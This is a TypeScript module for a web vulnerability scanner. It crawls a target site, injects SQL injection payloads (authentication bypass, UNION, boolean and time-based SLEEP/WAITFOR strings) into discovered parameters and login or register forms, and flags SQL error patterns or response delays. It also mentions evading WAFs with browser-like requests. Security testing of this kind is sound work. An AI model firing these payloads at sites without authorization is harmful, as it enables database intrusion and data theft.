import axios from 'axios';
import * as cheerio from 'cheerio';
import { Vulnerability } from '../types';
import { discoverEndpoints } from './endpoint-discovery';
import { discoverParameters, generateTestUrls, summarizeParameters } from './parameter-discovery';
import { browserGet, browserPost, isCloudflareBlocked, resetSession } from './http-client';

// ============================================================================
// SQL INJECTION SCANNER - OWASP A03:2021 (Injection)
// ============================================================================

/**
 * À QUOI SERT CE SCANNER :
 *
 * L'injection SQL est une attaque où un attaquant peut exécuter des commandes
 * SQL malveillantes en injectant du code dans les inputs d'une application.
 *
 * EXEMPLE D'ATTAQUE :
 * Input normal:   username = "admin"
 * Attaque SQLi:   username = "admin' OR '1'='1' --"
 * Résultat:       SELECT * FROM users WHERE username='admin' OR '1'='1' --'
 *                 → Contourne l'authentification (toujours vrai)
 *
 * RISQUES :
 * - Vol de données (numéros de cartes, mots de passe, etc.)
 * - Modification/suppression de données
 * - Exécution de commandes système (dans les cas graves)
 *
 * COMMENT DÉTECTER :
 * - Envoyer des payloads SQL malveillants
 * - Vérifier si des messages d'erreur SQL apparaissent
 * - Analyser les comportements anormaux (temps de réponse, etc.)
 */

// Payloads SQL injection (ordonnés par agressivité)
const SQLI_PAYLOADS = [
  // Basiques - Test de bypass d'authentification
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1--",

  // Commentaires SQL
  "admin' --",
  "admin' #",
  "admin'/*",

  // UNION-based (extraction de données)
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT 1,2,3--",

  // Boolean-based (test logique)
  "1' AND '1'='1",
  "1' AND '1'='2",
  "' AND 1=1--",
  "' AND 1=2--",

  // Time-based (délai volontaire)
  "1' AND SLEEP(5)--",
  "1' WAITFOR DELAY '0:0:5'--",
];

// Time-based blind SQLi payloads (prioritaires pour MySQL)
const TIME_BASED_PAYLOADS = [
  "' AND SLEEP(5)--",
  "' AND SLEEP(5)#",
  "\" AND SLEEP(5)--",
  "1' AND SLEEP(5)--",
  "admin' AND SLEEP(5)--",
  "' OR SLEEP(5)--",
  "') AND SLEEP(5)--",
  "' AND (SELECT SLEEP(5))--",
  "';SELECT SLEEP(5)--",
  "' AND BENCHMARK(5000000,SHA1('test'))--",
];

// Patterns d'erreur SQL (база данных exposed)
const SQL_ERROR_PATTERNS = [
  // MySQL
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /MySQL server version/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,

  // PostgreSQL
  /PostgreSQL.*ERROR/i,
  /Warning.*pg_/i,
  /valid PostgreSQL result/i,
  /Npgsql\./i,
  /pg_query/i,
  /pg_fetch/i,

  // SQL Server
  /Driver.*SQL.*Server/i,
  /OLE DB.*SQL Server/i,
  /SQLServer JDBC Driver/i,
  /SqlException/i,
  /System\.Data\.SqlClient/i,
  /Microsoft SQL Native Client/i,

  // Oracle
  /Oracle error/i,
  /Oracle.*Driver/i,
  /Warning.*oci_/i,
  /Warning.*ora_/i,
  /ORA-\d{5}/i,

  // SQLite
  /SQLite\/JDBCDriver/i,
  /SQLite\.Exception/i,
  /System\.Data\.SQLite/i,

  // Erreurs génériques
  /syntax error/i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /SQL command not properly ended/i,
];

// Indicateurs de vulnérabilité comportementale
const BEHAVIORAL_INDICATORS = [
  // Messages de succès suspects après payload
  /login successful/i,
  /welcome back/i,
  /dashboard/i,
];

/**
 * Point d'entrée principal du scanner SQLi
 * [OK] VERSION 2.0: Découverte automatique de TOUS les paramètres
 */
export async function scanSQLi(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[SQLi] Starting SQL Injection scan...');
  console.log('   [INFO] Using browser-like requests to bypass WAF...');
  console.log('   [INFO] Discovering all endpoints and parameters automatically...');

  // Reset session pour ce scan
  resetSession();

  try {
    // [OK] ÉTAPE 1: Découvrir TOUS les endpoints du site
    const allEndpoints = await discoverEndpoints(target);
    console.log(`   [STATS] Found ${allEndpoints.length} total endpoints`);

    // Limiter à 30 endpoints pour ne pas surcharger (priorité aux pages avec params)
    const endpointsWithParams = allEndpoints.filter(e => e.url.includes('?'));
    const endpointsToScan = [
      ...endpointsWithParams.slice(0, 20),
      ...allEndpoints.filter(e => !e.url.includes('?')).slice(0, 10)
    ].map(e => e.url);

    console.log(`   [TARGET] Will scan ${endpointsToScan.length} endpoints`);

    // [OK] ÉTAPE 2: Découvrir TOUS les paramètres testables
    const allParameters = await discoverParameters(endpointsToScan);
    summarizeParameters(allParameters);

    if (allParameters.length === 0) {
      console.log('   [WARNING]  No testable parameters found via auto-discovery');
      console.log('   [FALLBACK] Falling back to testing the target URL directly...');

      // FALLBACK: Tester au moins l'URL donnée
      return await scanSQLi_Fallback(target);
    }

    // Limiter à 50 paramètres max pour la performance
    const parametersToTest = allParameters.slice(0, 50);
    console.log(`   [TEST] Testing ${parametersToTest.length} parameters for SQLi...`);

    // [OK] ÉTAPE 3: Tester CHAQUE paramètre avec les payloads SQLi
    let tested = 0;
    for (const param of parametersToTest) {
      tested++;

      // Log progression
      if (tested % 10 === 0) {
        console.log(`   [PROGRESS] Progress: ${tested}/${parametersToTest.length} parameters tested...`);
      }

      let foundVuln = false;

      // Tester avec chaque payload SQLi (limiter à 5 pour performance)
      for (const payload of SQLI_PAYLOADS.slice(0, 5)) {
        try {
          const testRequest = generateTestUrls(param, payload);

          let response;
          if (testRequest.method === 'POST' && testRequest.data) {
            response = await browserPost(testRequest.url, testRequest.data as Record<string, string>, {
              referer: param.url,
              addDelay: true,
            });
          } else {
            response = await browserGet(testRequest.url, {
              referer: param.url,
              addDelay: true,
            });
          }

          // Vérifier si bloqué par WAF
          if (isCloudflareBlocked(response)) {
            console.log(`   [WARN] WAF blocking detected, skipping parameter...`);
            break;
          }

          // Vérifier les erreurs SQL dans la réponse
          const sqlError = detectSQLError(response.data);

          if (sqlError) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection Vulnerability',
              description: `The application is vulnerable to SQL injection. The parameter "${param.paramName}" does not properly sanitize user input, allowing attackers to execute arbitrary SQL commands.`,
              location: param.url,
              evidence: `Payload: ${payload}\nSQL Error: ${sqlError}\nParameter: ${param.paramName} (${param.paramType})\nMethod: ${param.method}`,
            });

            console.log(`   [CRITICAL] CRITICAL: SQLi found in "${param.paramName}" at ${param.url}`);
            foundVuln = true;
            break;
          }

        } catch (error) {
          // Timeout ou erreur réseau = continuer
        }

        // Petit délai pour ne pas surcharger
        await sleep(50);
      }

      if (!foundVuln && tested <= 10) {
        console.log(`   [OK] Parameter "${param.paramName}" at ${param.url.substring(0, 60)}... appears safe`);
      }
    }

    console.log(`\n   [OK] SQLi scan completed: ${vulnerabilities.length} vulnerabilities found\n`);

  } catch (error) {
    console.error('   [ERROR] Error scanning SQLi:', error);
  }

  return vulnerabilities;
}

/**
 * Utilitaire : Sleep
 */
function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * FALLBACK: Scanner SQLi classique si le parameter discovery échoue
 */
async function scanSQLi_Fallback(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('   [LIST] Using fallback mode - testing target URL directly');

  try {
    const response = await axios.get(target, {
      timeout: 10000,
      validateStatus: () => true,
      headers: { 'User-Agent': 'VulnScanner/2.0' },
    });

    if (response.status !== 200) {
      return vulnerabilities;
    }

    const $ = cheerio.load(response.data);

    // Tester les formulaires de la page
    const forms = $('form');
    for (let i = 0; i < forms.length; i++) {
      const form = $(forms[i]);
      const action = form.attr('action') || '';
      const method = (form.attr('method') || 'get').toLowerCase();
      const inputs = form.find('input, textarea').toArray();
      const inputNames = inputs
        .map(input => $(input).attr('name'))
        .filter((name): name is string => !!name);

      if (inputNames.length === 0) continue;

      const formUrl = new URL(action, target).href;

      for (const payload of SQLI_PAYLOADS.slice(0, 3)) {
        const testResult = await testSQLiPayload(formUrl, method, inputNames, payload);
        if (testResult.vulnerable) {
          vulnerabilities.push({
            type: 'sqli',
            severity: 'critical',
            title: 'SQL Injection Vulnerability',
            description: `The application is vulnerable to SQL injection. The parameter "${testResult.parameter}" does not properly sanitize user input, allowing attackers to execute arbitrary SQL commands.`,
            location: formUrl,
            evidence: `Payload: ${payload}\nSQL Error Detected: ${testResult.error}\nInput Field: ${testResult.parameter}`,
          });
          break;
        }
      }
    }

    // Tester les paramètres URL
    const url = new URL(target);
    const urlParams = Array.from(url.searchParams.keys());
    for (const param of urlParams) {
      for (const payload of SQLI_PAYLOADS.slice(0, 3)) {
        const testUrl = new URL(target);
        testUrl.searchParams.set(param, payload);

        try {
          const testResponse = await axios.get(testUrl.href, {
            timeout: 5000,
            validateStatus: () => true,
            headers: { 'User-Agent': 'VulnScanner/2.0' },
          });

          const sqlError = detectSQLError(testResponse.data);
          if (sqlError) {
            vulnerabilities.push({
              type: 'sqli',
              severity: 'critical',
              title: 'SQL Injection in URL Parameter',
              description: `The URL parameter "${param}" is vulnerable to SQL injection. The application exposes SQL error messages, indicating insufficient input validation.`,
              location: testUrl.href,
              evidence: `Payload: ${payload}\nSQL Error: ${sqlError}\nParameter: ${param}`,
            });
            break;
          }
        } catch (error) {
          // Continue
        }
      }
    }
  } catch (error) {
    console.error('   [ERROR] Error in fallback mode:', error);
  }

  return vulnerabilities;
}

/**
 * Teste un payload SQL injection sur un formulaire
 */
async function testSQLiPayload(
  url: string,
  method: string,
  params: string[],
  payload: string
): Promise<{ vulnerable: boolean; parameter?: string; error?: string }> {
  try {
    const data: Record<string, string> = {};

    // Injecter le payload dans TOUS les champs
    params.forEach(param => {
      data[param] = payload;
    });

    let response;

    if (method === 'post') {
      response = await axios.post(url, data, {
        timeout: 5000,
        validateStatus: () => true,
        headers: {
          'User-Agent': 'VulnScanner/2.0',
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
    } else {
      response = await axios.get(url, {
        params: data,
        timeout: 5000,
        validateStatus: () => true,
        headers: { 'User-Agent': 'VulnScanner/2.0' },
      });
    }

    // [OK] DÉTECTION STRICTE : Seulement si erreur SQL explicite
    const sqlError = detectSQLError(response.data);

    if (sqlError) {
      return {
        vulnerable: true,
        parameter: params[0],
        error: sqlError,
      };
    }

    // Vérifier les comportements suspects (authentification bypass)
    const hasSuspiciousBehavior = detectSuspiciousBehavior(response.data, payload);

    if (hasSuspiciousBehavior) {
      return {
        vulnerable: true,
        parameter: params[0],
        error: 'Behavioral anomaly detected (possible authentication bypass)',
      };
    }

  } catch (error) {
    // Timeout ou erreur réseau = pas une vulnérabilité
  }

  return { vulnerable: false };
}

/**
 * Détecte les erreurs SQL dans une réponse
 * [OK] ANTI-FAUX POSITIFS : Cherche des patterns SQL spécifiques
 */
function detectSQLError(html: string): string | null {
  if (!html || typeof html !== 'string') {
    return null;
  }

  const htmlStr = html.toString();

  for (const pattern of SQL_ERROR_PATTERNS) {
    const match = htmlStr.match(pattern);
    if (match) {
      // Trouver le contexte de l'erreur (50 chars avant et après)
      const index = htmlStr.indexOf(match[0]);
      const start = Math.max(0, index - 50);
      const end = Math.min(htmlStr.length, index + match[0].length + 50);
      const context = htmlStr.substring(start, end);

      return `${match[0]} (Context: ...${context}...)`;
    }
  }

  return null;
}

/**
 * Détecte les comportements suspects (bypass d'authentification)
 */
function detectSuspiciousBehavior(html: string, payload: string): boolean {
  if (!html || typeof html !== 'string') {
    return false;
  }

  const htmlStr = html.toString().toLowerCase();

  // Si le payload contient "OR '1'='1'" et la réponse contient des indicateurs de succès
  if (payload.includes("'1'='1'") || payload.includes('1=1')) {
    for (const indicator of BEHAVIORAL_INDICATORS) {
      if (indicator.test(htmlStr)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Fonction utilitaire pour échapper les caractères HTML
 * (Utilisé pour la validation)
 */
function isProperlyEscaped(original: string, reflected: string): boolean {
  // Vérifier si les caractères spéciaux ont été encodés
  const hasEncodedQuotes = reflected.includes('&#39;') || reflected.includes('&quot;');
  const hasEncodedBrackets = reflected.includes('&lt;') || reflected.includes('&gt;');

  return hasEncodedQuotes || hasEncodedBrackets;
}

/**
 * TIME-BASED BLIND SQL INJECTION SCANNER
 * Version améliorée avec support nopCommerce et détection CSRF
 */
export async function scanTimeBasedSQLi(target: string): Promise<Vulnerability[]> {
  const vulnerabilities: Vulnerability[] = [];

  console.log('\n[SQLi-TIME] Starting Time-Based Blind SQL Injection scan...');

  try {
    const baseUrl = new URL(target);
    const cheerio = await import('cheerio');

    // Configuration des formulaires à tester (adaptée pour nopCommerce et autres CMS)
    const formsToTest = [
      {
        url: `${baseUrl.origin}/login`,
        method: 'POST',
        fields: {
          email: ['loginModel.Email', 'email', 'Email', 'username', 'Username'],
          password: ['loginModel.Password', 'password', 'Password'],
        }
      },
      {
        url: `${baseUrl.origin}/register`,
        method: 'POST',
        fields: {
          email: ['registerModel.Email', 'email', 'Email'],
          password: ['registerModel.Password', 'password', 'Password'],
        }
      },
    ];

    for (const form of formsToTest) {
      console.log(`   [TEST] Testing ${form.url}...`);

      try {
        // Récupérer la page pour obtenir le token CSRF et cookies
        const pageResponse = await axios.get(form.url, {
          timeout: 15000,
          validateStatus: () => true,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          },
        });

        if (pageResponse.status >= 400) {
          console.log(`   [SKIP] ${form.url} returns ${pageResponse.status}`);
          continue;
        }

        // Extraire le token CSRF
        const $ = cheerio.load(pageResponse.data);
        const csrfToken = $('input[name="__RequestVerificationToken"]').val() as string || '';

        // Récupérer les cookies
        let cookies = '';
        if (pageResponse.headers['set-cookie']) {
          cookies = pageResponse.headers['set-cookie'].map((c: string) => c.split(';')[0]).join('; ');
        }

        // Détecter les vrais noms de champs
        let emailFieldName = form.fields.email[0];
        let passwordFieldName = form.fields.password[0];

        for (const name of form.fields.email) {
          if ($(`input[name="${name}"]`).length > 0) {
            emailFieldName = name;
            break;
          }
        }

        for (const name of form.fields.password) {
          if ($(`input[name="${name}"]`).length > 0) {
            passwordFieldName = name;
            break;
          }
        }

        console.log(`   [INFO] Form fields: ${emailFieldName}, ${passwordFieldName}`);
        console.log(`   [INFO] CSRF: ${csrfToken ? 'Found' : 'None'}`);

        // Mesurer le baseline
        const baselineData: Record<string, string> = {};
        if (csrfToken) baselineData['__RequestVerificationToken'] = csrfToken;
        baselineData[emailFieldName] = 'test@test.com';
        baselineData[passwordFieldName] = 'test123456';

        const baselineStart = Date.now();
        await axios.post(form.url, new URLSearchParams(baselineData).toString(), {
          timeout: 15000,
          validateStatus: () => true,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies,
            'Referer': form.url,
          },
        });
        const baselineTime = Date.now() - baselineStart;
        console.log(`   [INFO] Baseline: ${baselineTime}ms`);

        // Tester les payloads
        for (const payload of TIME_BASED_PAYLOADS.slice(0, 5)) {
          try {
            const testData: Record<string, string> = {};
            if (csrfToken) testData['__RequestVerificationToken'] = csrfToken;
            testData[emailFieldName] = payload;
            testData[passwordFieldName] = 'test123456';

            console.log(`   [PAYLOAD] ${payload.substring(0, 25)}...`);

            const startTime = Date.now();
            await axios.post(form.url, new URLSearchParams(testData).toString(), {
              timeout: 25000,
              validateStatus: () => true,
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookies,
                'Referer': form.url,
              },
            });
            const responseTime = Date.now() - startTime;

            console.log(`   [TIME] ${responseTime}ms (delay: ${responseTime - baselineTime}ms)`);

            if (responseTime > baselineTime + 4000) {
              console.log(`   [CRITICAL] TIME-BASED SQLi DETECTED!`);

              vulnerabilities.push({
                type: 'sqli',
                severity: 'critical',
                title: 'Time-Based Blind SQL Injection',
                description: `The form at ${form.url} is vulnerable to time-based blind SQL injection. Response delayed by ${responseTime - baselineTime}ms when SLEEP(5) was injected.`,
                location: form.url,
                evidence: `Field: ${emailFieldName}\nPayload: ${payload}\nBaseline: ${baselineTime}ms\nWith payload: ${responseTime}ms\nDelay: ${responseTime - baselineTime}ms`,
              });
              break;
            }

          } catch (error: any) {
            if (error.code === 'ECONNABORTED') {
              console.log(`   [CRITICAL] TIMEOUT - Likely vulnerable!`);
              vulnerabilities.push({
                type: 'sqli',
                severity: 'critical',
                title: 'Time-Based Blind SQL Injection (Timeout)',
                description: `Request timed out when testing ${form.url}, indicating SQL command execution.`,
                location: form.url,
                evidence: `Payload caused request timeout (>25 seconds)`,
              });
              break;
            }
          }

          await sleep(300);
        }

        if (vulnerabilities.length > 0) break;

      } catch (error: any) {
        console.log(`   [ERROR] ${error.message}`);
      }
    }

  } catch (error) {
    console.error('   [ERROR] Time-based SQLi scan error:', error);
  }

  console.log(`   [OK] Time-based SQLi scan completed: ${vulnerabilities.length} vulnerabilities found`);
  return vulnerabilities;
}
